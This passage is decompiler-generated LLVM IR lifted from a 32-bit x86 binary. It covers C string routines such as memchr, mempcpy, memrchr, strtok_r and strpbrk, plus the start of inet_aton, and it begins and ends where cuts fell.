  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 160, { 1, 0, 2 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 16, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 176, { 1, 2, 0 }
  uselistorder i32 112, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 -53, { 1, 0 }
  uselistorder i32* @esp, { 154, 5, 155, 0, 1, 342, 2, 3, 4, 6, 156, 157, 158, 159, 7, 160, 161, 162, 163, 10, 164, 165, 166, 11, 167, 12, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 9, 181, 13, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 8, 194, 195, 196, 197, 198, 199, 231, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 232, 233, 234, 235, 236, 237, 270, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 336, 337, 338, 339, 340, 341 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 7, 23, 21, 20, 22, 8, 9, 10, 11, 18, 12, 17, 0, 1, 2, 3, 13, 4, 5, 6, 14, 15, 16, 19 }
  uselistorder i32 48, { 0, 5, 2, 1, 7, 3, 4, 8, 9, 10, 11, 6 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i8 48, { 7, 8, 0, 6, 1, 2, 4, 3, 5, 9 }
  uselistorder i32 9, { 8, 9, 2, 7, 3, 10, 11, 12, 13, 4, 5, 6, 0, 14, 1 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 4, 17, 5, 6, 18, 7, 16, 9, 11, 10, 1, 13, 12, 2, 15, 14, 3, 0, 8 }
  uselistorder i32 13, { 0, 5, 4, 1, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder i32 32, { 52, 70, 30, 50, 53, 54, 3, 2, 4, 5, 43, 6, 7, 51, 8, 9, 10, 11, 12, 55, 56, 0, 57, 58, 59, 60, 61, 62, 63, 13, 64, 44, 68, 69, 67, 65, 66, 15, 14, 34, 17, 16, 33, 19, 18, 35, 32, 20, 45, 46, 21, 47, 1, 23, 22, 36, 37, 48, 38, 24, 25, 27, 26, 39, 41, 29, 28, 40, 42, 31, 49 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i32 6, { 7, 13, 1, 12, 8, 9, 5, 17, 10, 14, 2, 3, 0, 4, 6, 15, 11, 16 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder i8 32, { 11, 0, 7, 12, 17, 18, 19, 8, 13, 14, 2, 15, 3, 9, 1, 16, 4, 10, 5, 6 }
  uselistorder label %dec_label_pc_8052293, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052291, { 1, 0 }
  uselistorder label %dec_label_pc_8052212, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80521bf, { 1, 0 }
  uselistorder label %dec_label_pc_8052197, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052166, { 1, 0 }
  uselistorder label %dec_label_pc_8052153, { 1, 0 }
  uselistorder label %dec_label_pc_8052139, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052106, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80520f1, { 1, 0 }
  uselistorder label %dec_label_pc_80520e6, { 1, 0 }
  uselistorder label %dec_label_pc_805206d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805205f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052025, { 1, 0 }
  uselistorder label %dec_label_pc_8051ff5.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f90, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051f7b, { 1, 0 }
  uselistorder label %dec_label_pc_8051ee7, { 1, 0 }
  uselistorder label %dec_label_pc_8051ebf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ebd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051ead, { 1, 0 }
  uselistorder label %dec_label_pc_8051e41, { 1, 0 }
  uselistorder label %dec_label_pc_8051d6a, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80522d0 = load i32, i32* @edi, align 4
  store i32 %v0_80522d0, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80522d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80522d7, i32* %edi.global-to-local, align 4
  %v1_80522df = icmp eq i32 %arg3, 0
  store i1 %v1_80522df, i1* %zf.global-to-local, align 1
  br i1 %v1_80522df, label %dec_label_pc_80522ef, label %dec_label_pc_80522e3

dec_label_pc_80522e3:                             ; preds = %entry
  %v2_80522e3 = call i32 @_strlen(i8* %arg1)
  %v3_80522e3 = mul i32 %v2_80522e3, -1
  %v4_80522e3 = add i32 %v3_80522e3, -2
  store i32 %v4_80522e3, i32* @ecx, align 4
  %v0_80522e5 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80522e5, label %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge, label %dec_label_pc_80522e7

dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge: ; preds = %dec_label_pc_80522e3
  %v0_80522ec.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80522ec.pre, -1
  br label %dec_label_pc_80522ec

dec_label_pc_80522e7:                             ; preds = %dec_label_pc_80522e3
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80522ec

dec_label_pc_80522ec:                             ; preds = %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge, %dec_label_pc_80522e7
  %v0_80522ec = phi i32 [ %phitmp, %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge ], [ 0, %dec_label_pc_80522e7 ]
  %v8_80522ec = icmp eq i32 %v0_80522ec, 0
  store i1 %v8_80522ec, i1* %zf.global-to-local, align 1
  store i32 %v0_80522ec, i32* %edi.global-to-local, align 4
  %v2_80522ef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522ef

dec_label_pc_80522ef:                             ; preds = %entry, %dec_label_pc_80522ec
  %v0_80522f0 = phi i32 [ 0, %entry ], [ %v0_80522ec, %dec_label_pc_80522ec ]
  %v2_80522ef = phi i32 [ %v0_80522d0, %entry ], [ %v2_80522ef.pre, %dec_label_pc_80522ec ]
  store i32 %v2_80522ef, i32* @edi, align 4
  ret i32 %v0_80522f0

; uselistorder directives
  uselistorder i32 %v0_80522ec, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80522ef, { 1, 0 }
  uselistorder label %dec_label_pc_80522ec, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80522f4 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052307 = inttoptr i32 %arg1 to i16*
  %v4_8052307 = call i32 @memcpy(i16* %v3_8052307, i32 %arg2, i32 %arg3)
  %v0_805230f = load i32, i32* @esi, align 4
  %v2_805230f = add i32 %v0_805230f, %arg3
  store i32 %v0_80522f4, i32* @esi, align 4
  ret i32 %v2_805230f

; uselistorder directives
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 5, 0, 1, 8, 6, 9, 2, 3, 4, 7 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_805231d = urem i32 %arg2, 256
  %v4_8052329 = sext i8 %arg1 to i32
  %v2_805232d = add i32 %v4_8052329, %arg3
  %v1_805233f6 = icmp eq i32 %arg3, 0
  br i1 %v1_805233f6, label %dec_label_pc_8052347, label %dec_label_pc_8052343

dec_label_pc_8052331:                             ; preds = %dec_label_pc_8052343
  %v1_8052331 = add i32 %v0_8052331, -1
  %v5_8052332 = load i32, i32* @edx, align 4
  %v6_8052332 = and i32 %v5_8052332, -256
  %v7_8052332 = or i32 %v6_8052332, %v4_805231d
  store i32 %v7_8052332, i32* @edx, align 4
  %v1_8052336 = inttoptr i32 %v1_8052331 to i8*
  %v2_8052336 = load i8, i8* %v1_8052336, align 1
  %v15_8052336 = icmp eq i8 %v2_8052336, %tmp
  br i1 %v15_8052336, label %dec_label_pc_80523c4, label %dec_label_pc_805233e

dec_label_pc_805233e:                             ; preds = %dec_label_pc_8052331
  %v1_805233e = add i32 %v0_805233e, -1
  %v8_805233e = icmp eq i32 %v1_805233e, 0
  br i1 %v8_805233e, label %dec_label_pc_8052347, label %dec_label_pc_8052343

dec_label_pc_8052343:                             ; preds = %entry, %dec_label_pc_805233e
  %v0_805233e = phi i32 [ %v1_805233e, %dec_label_pc_805233e ], [ %arg3, %entry ]
  %v0_8052331 = phi i32 [ %v1_8052331, %dec_label_pc_805233e ], [ %v2_805232d, %entry ]
  %v2_8052343 = urem i32 %v0_8052331, 4
  %v3_8052343 = icmp eq i32 %v2_8052343, 0
  %v1_8052345 = icmp eq i1 %v3_8052343, false
  br i1 %v1_8052345, label %dec_label_pc_8052331, label %dec_label_pc_8052347

dec_label_pc_8052347:                             ; preds = %dec_label_pc_805233e, %dec_label_pc_8052343, %entry
  %v0_80523aa.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_805233e ], [ %v0_805233e, %dec_label_pc_8052343 ]
  %v0_805234c = phi i32 [ %v2_805232d, %entry ], [ %v1_8052331, %dec_label_pc_805233e ], [ %v0_8052331, %dec_label_pc_8052343 ]
  store i32 %v0_805234c, i32* @ecx, align 4
  %v2_8052350 = mul nuw nsw i32 %v4_805231d, 256
  %v2_8052353 = or i32 %v2_8052350, %v4_805231d
  %v2_8052357 = mul i32 %v2_8052353, 65536
  %v2_805235a = or i32 %v2_8052357, %v2_8052353
  %v6_80523ad54 = icmp ugt i32 %v0_80523aa.pr, 3
  br i1 %v6_80523ad54, label %dec_label_pc_805235e, label %dec_label_pc_80523af

dec_label_pc_805235e:                             ; preds = %dec_label_pc_8052347, %dec_label_pc_80523a7
  %v0_80523a756 = phi i32 [ %v1_80523a7, %dec_label_pc_80523a7 ], [ %v0_80523aa.pr, %dec_label_pc_8052347 ]
  %v0_805235e55 = phi i32 [ %v1_805235e, %dec_label_pc_80523a7 ], [ %v0_805234c, %dec_label_pc_8052347 ]
  %v1_805235e = add i32 %v0_805235e55, -4
  store i32 %v1_805235e, i32* @ecx, align 4
  %v2_8052363 = inttoptr i32 %v1_805235e to i32*
  %v3_8052363 = load i32, i32* %v2_8052363, align 4
  %v4_8052363 = xor i32 %v3_8052363, %v2_805235a
  %v1_8052365 = add i32 %v4_8052363, 2130640639
  %v1_805236b = sub i32 -1, %v4_8052363
  %v2_805236d = xor i32 %v1_8052365, %v1_805236b
  %v1_805236f = and i32 %v2_805236d, -2130640640
  %v2_805236f = icmp eq i32 %v1_805236f, 0
  br i1 %v2_805236f, label %dec_label_pc_80523a7, label %dec_label_pc_8052377

dec_label_pc_8052377:                             ; preds = %dec_label_pc_805235e
  %v7_8052377 = or i32 %v1_805236f, %v4_805231d
  %v1_805237b = add i32 %v0_805235e55, -1
  %v2_805237e = inttoptr i32 %v1_805237b to i8*
  %v3_805237e = load i8, i8* %v2_805237e, align 1
  %v16_805237e = icmp eq i8 %v3_805237e, %tmp
  br i1 %v16_805237e, label %dec_label_pc_80523c4, label %dec_label_pc_8052383

dec_label_pc_8052383:                             ; preds = %dec_label_pc_8052377
  %v1_8052387 = add i32 %v0_805235e55, -2
  %v2_805238a = inttoptr i32 %v1_8052387 to i8*
  %v3_805238a = load i8, i8* %v2_805238a, align 1
  %v16_805238a = icmp eq i8 %v3_805238a, %tmp
  br i1 %v16_805238a, label %dec_label_pc_80523c4, label %dec_label_pc_805238f

dec_label_pc_805238f:                             ; preds = %dec_label_pc_8052383
  %v1_8052393 = add i32 %v0_805235e55, -3
  %v2_8052396 = inttoptr i32 %v1_8052393 to i8*
  %v3_8052396 = load i8, i8* %v2_8052396, align 1
  %v16_8052396 = icmp eq i8 %v3_8052396, %tmp
  br i1 %v16_8052396, label %dec_label_pc_80523c4, label %dec_label_pc_805239b

dec_label_pc_805239b:                             ; preds = %dec_label_pc_805238f
  %v1_805239f = inttoptr i32 %v1_805235e to i8*
  %v2_805239f = load i8, i8* %v1_805239f, align 1
  %v15_805239f = icmp eq i8 %v2_805239f, %tmp
  %v1_80523a1 = icmp eq i1 %v15_805239f, false
  br i1 %v1_80523a1, label %dec_label_pc_80523a7, label %dec_label_pc_80523a3

dec_label_pc_80523a3:                             ; preds = %dec_label_pc_805239b
  br label %dec_label_pc_80523c4

dec_label_pc_80523a7:                             ; preds = %dec_label_pc_805239b, %dec_label_pc_805235e
  %v5_80523b426 = phi i32 [ %v7_8052377, %dec_label_pc_805239b ], [ 0, %dec_label_pc_805235e ]
  %v1_80523a7 = add i32 %v0_80523a756, -4
  %v6_80523ad = icmp ugt i32 %v1_80523a7, 3
  br i1 %v6_80523ad, label %dec_label_pc_805235e, label %dec_label_pc_80523af

dec_label_pc_80523af:                             ; preds = %dec_label_pc_80523a7, %dec_label_pc_8052347
  %v5_80523b425.lcssa = phi i32 [ %v4_805231d, %dec_label_pc_8052347 ], [ %v5_80523b426, %dec_label_pc_80523a7 ]
  %v0_805235e.lcssa = phi i32 [ %v0_805234c, %dec_label_pc_8052347 ], [ %v1_805235e, %dec_label_pc_80523a7 ]
  %v0_80523a7.lcssa = phi i32 [ %v0_80523aa.pr, %dec_label_pc_8052347 ], [ %v1_80523a7, %dec_label_pc_80523a7 ]
  br label %dec_label_pc_80523bc

dec_label_pc_80523b3:                             ; preds = %dec_label_pc_80523bc
  %v1_80523bc = add i32 %v0_80523bc, -1
  %v1_80523b3 = add i32 %v0_80523b3, -1
  %v6_80523b4 = and i32 %v5_80523b4, -256
  %v7_80523b4 = or i32 %v6_80523b4, %v4_805231d
  %v1_80523b8 = inttoptr i32 %v1_80523b3 to i8*
  %v2_80523b8 = load i8, i8* %v1_80523b8, align 1
  %v15_80523b8 = icmp eq i8 %v2_80523b8, %tmp
  br i1 %v15_80523b8, label %dec_label_pc_80523c4, label %dec_label_pc_80523bc

dec_label_pc_80523bc:                             ; preds = %dec_label_pc_80523b3, %dec_label_pc_80523af
  %v5_80523b4 = phi i32 [ %v7_80523b4, %dec_label_pc_80523b3 ], [ %v5_80523b425.lcssa, %dec_label_pc_80523af ]
  %v0_80523b3 = phi i32 [ %v1_80523b3, %dec_label_pc_80523b3 ], [ %v0_805235e.lcssa, %dec_label_pc_80523af ]
  %v0_80523bc = phi i32 [ %v1_80523bc, %dec_label_pc_80523b3 ], [ %v0_80523a7.lcssa, %dec_label_pc_80523af ]
  %v10_80523bd = icmp eq i32 %v0_80523bc, 0
  %v1_80523c0 = icmp eq i1 %v10_80523bd, false
  br i1 %v1_80523c0, label %dec_label_pc_80523b3, label %dec_label_pc_80523c2

dec_label_pc_80523c2:                             ; preds = %dec_label_pc_80523bc
  br label %dec_label_pc_80523c4

dec_label_pc_80523c4:                             ; preds = %dec_label_pc_8052331, %dec_label_pc_805238f, %dec_label_pc_8052383, %dec_label_pc_8052377, %dec_label_pc_80523b3, %dec_label_pc_80523a3, %dec_label_pc_80523c2
  %v0_80523c7 = phi i32 [ %v1_805235e, %dec_label_pc_80523a3 ], [ 0, %dec_label_pc_80523c2 ], [ %v1_80523b3, %dec_label_pc_80523b3 ], [ %v1_8052393, %dec_label_pc_805238f ], [ %v1_8052387, %dec_label_pc_8052383 ], [ %v1_805237b, %dec_label_pc_8052377 ], [ %v1_8052331, %dec_label_pc_8052331 ]
  ret i32 %v0_80523c7

; uselistorder directives
  uselistorder i32 %v0_80523bc, { 1, 0 }
  uselistorder i32 %v1_80523a7, { 0, 2, 1 }
  uselistorder i32 %v1_805235e, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805235e55, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052353, { 1, 0 }
  uselistorder i32 %v0_8052331, { 1, 0, 2 }
  uselistorder i32 %v2_805232d, { 1, 0 }
  uselistorder i32 %v4_805231d, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 1, 6, 2, 3, 4, 0, 5 }
  uselistorder i32 -2, { 2, 6, 13, 14, 0, 16, 17, 18, 3, 5, 4, 1, 7, 8, 9, 15, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523c4, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805235e, { 1, 0 }
  uselistorder label %dec_label_pc_8052347, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052343, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80523c8 = load i32, i32* @edi, align 4
  %v0_80523c9 = load i32, i32* @esi, align 4
  %v0_80523ca = load i32, i32* @ebx, align 4
  store i32 %v0_80523ca, i32* %stack_var_-12, align 4
  %v4_80523cb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80523cb, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80523d7 = icmp eq i8* %arg1, null
  %v1_80523d9 = icmp eq i1 %v1_80523d7, false
  br i1 %v1_80523d9, label %dec_label_pc_80523dd, label %dec_label_pc_80523db

dec_label_pc_80523db:                             ; preds = %entry
  %v1_80523db = inttoptr i32 %arg3 to i32*
  %v2_80523db = load i32, i32* %v1_80523db, align 4
  store i32 %v2_80523db, i32* @ebx, align 4
  br label %dec_label_pc_80523dd

dec_label_pc_80523dd:                             ; preds = %entry, %dec_label_pc_80523db
  %v0_80523e0 = phi i32 [ %v4_80523cb, %entry ], [ %v2_80523db, %dec_label_pc_80523db ]
  %v0_80523dd = load i32, i32* @ecx, align 4
  %v5_80523e0 = inttoptr i32 %v0_80523e0 to i8*
  %v8_80523e1 = call i32 @__GI_strspn(i8* %v5_80523e0, i32 %arg2, i32 %v0_80523dd, i32 %v0_80523dd)
  store i32 %v8_80523e1, i32* %eax.global-to-local, align 4
  %v0_80523e9 = load i32, i32* @ebx, align 4
  %v2_80523e9 = add i32 %v0_80523e9, %v8_80523e1
  store i32 %v2_80523e9, i32* @ebx, align 4
  %v1_80523eb = inttoptr i32 %v2_80523e9 to i8*
  %v2_80523eb = load i8, i8* %v1_80523eb, align 1
  %v3_80523eb = icmp eq i8 %v2_80523eb, 0
  %v1_80523ee = icmp eq i1 %v3_80523eb, false
  br i1 %v1_80523ee, label %dec_label_pc_80523f6, label %dec_label_pc_80523f0

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_80523dd
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80523f2 = load i32, i32* @esi, align 4
  %v2_80523f2 = inttoptr i32 %v1_80523f2 to i32*
  store i32 %v2_80523e9, i32* %v2_80523f2, align 4
  %v0_8052420.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805241d

dec_label_pc_80523f6:                             ; preds = %dec_label_pc_80523dd
  %v0_80523f6 = load i32, i32* @edx, align 4
  %v0_80523f8 = load i32, i32* @edi, align 4
  %v8_80523fa = call i32 @__GI_strpbrk(i8* %v1_80523eb, i32 %v0_80523f8, i32 %v0_80523f6, i32 %v0_80523f6)
  store i32 %v8_80523fa, i32* %eax.global-to-local, align 4
  %v2_8052402 = icmp eq i32 %v8_80523fa, 0
  %v1_8052404 = icmp eq i1 %v2_8052402, false
  br i1 %v1_8052404, label %dec_label_pc_8052415, label %dec_label_pc_8052406

dec_label_pc_8052406:                             ; preds = %dec_label_pc_80523f6
  %v0_805240a = load i32, i32* @ebx, align 4
  %v5_805240a = inttoptr i32 %v0_805240a to i8*
  %v8_805240b = call i32 @rawmemchr(i8* %v5_805240a, i32 0, i32 %v8_80523fa, i32 %v8_80523fa)
  br label %dec_label_pc_8052419

dec_label_pc_8052415:                             ; preds = %dec_label_pc_80523f6
  %v9_80523fa = inttoptr i32 %v8_80523fa to i8*
  store i8 0, i8* %v9_80523fa, align 1
  %v2_8052418 = add i32 %v8_80523fa, 1
  br label %dec_label_pc_8052419

dec_label_pc_8052419:                             ; preds = %dec_label_pc_8052406, %dec_label_pc_8052415
  %storemerge = phi i32 [ %v2_8052418, %dec_label_pc_8052415 ], [ %v8_805240b, %dec_label_pc_8052406 ]
  %v0_8052419 = phi i32 [ %v2_8052418, %dec_label_pc_8052415 ], [ %v8_805240b, %dec_label_pc_8052406 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052419 = load i32, i32* @esi, align 4
  %v2_8052419 = inttoptr i32 %v1_8052419 to i32*
  store i32 %v0_8052419, i32* %v2_8052419, align 4
  %v0_805241b = load i32, i32* @ebx, align 4
  store i32 %v0_805241b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805241d

dec_label_pc_805241d:                             ; preds = %dec_label_pc_80523f0, %dec_label_pc_8052419
  %v0_8052420 = phi i32 [ %v0_8052420.pre, %dec_label_pc_80523f0 ], [ %v0_805241b, %dec_label_pc_8052419 ]
  %v2_805241d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805241d, i32* @ebx, align 4
  store i32 %v0_80523c9, i32* @esi, align 4
  store i32 %v0_80523c8, i32* @edi, align 4
  ret i32 %v0_8052420

; uselistorder directives
  uselistorder i32 %v8_80523fa, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805241d, { 1, 0 }
  uselistorder label %dec_label_pc_8052419, { 1, 0 }
  uselistorder label %dec_label_pc_80523dd, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052425 = load i32, i32* @ebx, align 4
  %v2_805243c25 = load i8, i8* %arg1, align 1
  %v4_805243e29 = icmp eq i8 %v2_805243c25, 0
  br i1 %v4_805243e29, label %dec_label_pc_8052446, label %dec_label_pc_8052442.lr.ph

dec_label_pc_8052442.lr.ph:                       ; preds = %entry
  %v3_805243c26 = zext i8 %v2_805243c25 to i32
  %v5_805243c27 = and i32 %v0_8052425, -256
  %v6_805243c28 = or i32 %v3_805243c26, %v5_805243c27
  %v4_805242a = ptrtoint i8* %arg1 to i32
  %v1_805243513 = inttoptr i32 %arg2 to i8*
  %v4_8052435.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052442

dec_label_pc_8052430:                             ; preds = %dec_label_pc_8052442, %dec_label_pc_8052434
  %v6_805243523 = phi i32 [ %v6_8052435, %dec_label_pc_8052434 ], [ %v6_805243517, %dec_label_pc_8052442 ]
  %v2_805243522 = phi i8 [ %v2_8052435, %dec_label_pc_8052434 ], [ %v2_805243514, %dec_label_pc_8052442 ]
  %v0_805243421 = phi i32 [ %v1_8052434, %dec_label_pc_8052434 ], [ %arg2, %dec_label_pc_8052442 ]
  %v15_8052430 = icmp eq i8 %v2_805243522, %v2_805243c33
  br i1 %v15_8052430, label %dec_label_pc_8052448, label %dec_label_pc_8052434

dec_label_pc_8052434:                             ; preds = %dec_label_pc_8052430
  %v1_8052434 = add i32 %v0_805243421, 1
  store i32 %v1_8052434, i32* @edx, align 4
  %v1_8052435 = inttoptr i32 %v1_8052434 to i8*
  %v2_8052435 = load i8, i8* %v1_8052435, align 1
  %v3_8052435 = zext i8 %v2_8052435 to i32
  %v5_8052435 = and i32 %v6_805243523, -256
  %v6_8052435 = or i32 %v3_8052435, %v5_8052435
  store i32 %v6_8052435, i32* @ecx, align 4
  %v4_8052437 = icmp eq i8 %v2_8052435, 0
  %v1_8052439 = icmp eq i1 %v4_8052437, false
  br i1 %v1_8052439, label %dec_label_pc_8052430, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_8052434, %dec_label_pc_8052442
  %v4_8052435.pre36 = phi i32 [ %v6_805243517, %dec_label_pc_8052442 ], [ %v6_8052435, %dec_label_pc_8052434 ]
  %v1_805243b = add i32 %v0_805243b31, 1
  %v1_805243c = inttoptr i32 %v1_805243b to i8*
  %v2_805243c = load i8, i8* %v1_805243c, align 1
  %v3_805243c = zext i8 %v2_805243c to i32
  %v5_805243c = and i32 %v6_805243c34, -256
  %v6_805243c = or i32 %v3_805243c, %v5_805243c
  %v4_805243e = icmp eq i8 %v2_805243c, 0
  br i1 %v4_805243e, label %dec_label_pc_8052446, label %dec_label_pc_8052442

dec_label_pc_8052442:                             ; preds = %dec_label_pc_8052442.lr.ph, %dec_label_pc_805243b
  %v4_8052435.pre = phi i32 [ %v4_8052435.pre.pre, %dec_label_pc_8052442.lr.ph ], [ %v4_8052435.pre36, %dec_label_pc_805243b ]
  %v6_805243c34 = phi i32 [ %v6_805243c28, %dec_label_pc_8052442.lr.ph ], [ %v6_805243c, %dec_label_pc_805243b ]
  %v2_805243c33 = phi i8 [ %v2_805243c25, %dec_label_pc_8052442.lr.ph ], [ %v2_805243c, %dec_label_pc_805243b ]
  %v0_805243b31 = phi i32 [ %v4_805242a, %dec_label_pc_8052442.lr.ph ], [ %v1_805243b, %dec_label_pc_805243b ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805243514 = load i8, i8* %v1_805243513, align 1
  %v3_805243515 = zext i8 %v2_805243514 to i32
  %v5_805243516 = and i32 %v4_8052435.pre, -256
  %v6_805243517 = or i32 %v3_805243515, %v5_805243516
  store i32 %v6_805243517, i32* @ecx, align 4
  %v4_805243718 = icmp eq i8 %v2_805243514, 0
  %v1_805243920 = icmp eq i1 %v4_805243718, false
  br i1 %v1_805243920, label %dec_label_pc_8052430, label %dec_label_pc_805243b

dec_label_pc_8052446:                             ; preds = %dec_label_pc_805243b, %entry
  br label %dec_label_pc_8052448

dec_label_pc_8052448:                             ; preds = %dec_label_pc_8052430, %dec_label_pc_8052446
  %v0_805244a = phi i32 [ 0, %dec_label_pc_8052446 ], [ %v0_805243b31, %dec_label_pc_8052430 ]
  store i32 %v0_8052425, i32* @ebx, align 4
  ret i32 %v0_805244a

; uselistorder directives
  uselistorder i32 %v6_805243517, { 2, 0, 1 }
  uselistorder i8 %v2_805243514, { 1, 2, 0 }
  uselistorder i32 %v1_805243b, { 1, 0 }
  uselistorder i32 %v6_8052435, { 1, 2, 0 }
  uselistorder i8 %v2_8052435, { 1, 2, 0 }
  uselistorder i32 %v1_8052434, { 2, 1, 0 }
  uselistorder i8 %v2_805243c25, { 0, 2, 1 }
  uselistorder i32 %v0_8052425, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052448, { 1, 0 }
  uselistorder label %dec_label_pc_8052442, { 1, 0 }
  uselistorder label %dec_label_pc_805243b, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8052457 = icmp eq i8* %arg1, null
